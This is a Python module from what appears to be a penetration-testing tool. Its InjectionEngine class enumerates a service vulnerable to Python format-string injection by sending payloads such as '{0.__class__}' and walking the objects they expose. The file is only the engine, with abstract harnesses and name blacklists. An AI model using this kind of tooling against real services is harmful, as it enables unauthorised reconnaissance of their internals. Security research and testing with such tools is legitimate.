"""Implementation of the InjectionEngine class."""

from typing import (
    Iterator,
    List,
    Optional,
    Set)

from .defaults import (
    DEFAULT_ATTRIBUTE_BLACKLIST,
    DEFAULT_CLASS_BLACKLIST,
    DEFAULT_MODULE_BLACKLIST)
from .harnesses import (
    AbstractInjectionHarness)
from .walkers import (
    AbstractInjectionWalker,
    FailedInjectionWalker,
    ModuleInjectionWalker)


class InjectionEngine:
    """Enumerate a vulnerable service via format() injections."""

    def __init__(
        self,
        harness: AbstractInjectionHarness,
        attribute_blacklist: Set[str] = DEFAULT_ATTRIBUTE_BLACKLIST,
        class_blacklist: Set[str] = DEFAULT_CLASS_BLACKLIST,
        module_blacklist: Set[str] = DEFAULT_MODULE_BLACKLIST
    ) -> None:
        self._harness = harness
        self._attribute_blacklist: Set[str] = set(attribute_blacklist)
        self._class_blacklist: Set[str] = set(class_blacklist)
        self._module_blacklist: Set[str] = set(module_blacklist)

        self._visited_module_walkers: List[AbstractInjectionWalker] = []

    def run(
        self,
        injectable_index: int,
        bytecode_version: str
    ) -> Iterator[AbstractInjectionWalker]:
        """Yield results from sending injections via :data:`harness`.

        Note that the state of the called instance is mutating throughout the
        runtime of this function.

        """
        format_str = f'{injectable_index}.__class__'

        response: Optional[str] = self._harness.send_injection(format_str)
        if not response:
            yield FailedInjectionWalker.msg(
                'Unable to trigger initial injection at index '
                f'{injectable_index}')
            return

        walker_cls = AbstractInjectionWalker.matching_subclass(
            format_str, response)
        if walker_cls is None:
            yield FailedInjectionWalker.msg(
                f'Unable to parse injection response: {response}')
            return

        walker = walker_cls(
            self._harness, format_str, response, bytecode_version, self)

        for walker in walker.walk():
            if isinstance(walker, ModuleInjectionWalker):
                self._visited_module_walkers.append(walker)
            yield walker

    @property
    def harness(
        self
    ) -> AbstractInjectionHarness:
        """The harness used to send payloads to the vulnerable service."""
        return self._harness

    @property
    def attribute_blacklist(
        self
    ) -> Set[str]:
        """Attribute names that will not be followed."""
        return self._attribute_blacklist

    @property
    def class_blacklist(
        self
    ) -> Set[str]:
        """Base class names that will not be followed."""
        return self._class_blacklist

    @property
    def module_blacklist(
        self
    ) -> Set[str]:
        """Module names that will not be followed."""
        return self._module_blacklist

    @property
    def visited_module_walkers(
        self
    ) -> Set[AbstractInjectionWalker]:
        """A list of walkers that visited modules."""
        return self._visited_module_walkers

    def __str__(
        self
    ) -> str:
        # TODO
        return 'TODO'

    def __repr__(
        self
    ) -> str:
        return f'<{self.__class__.__qualname__}>'
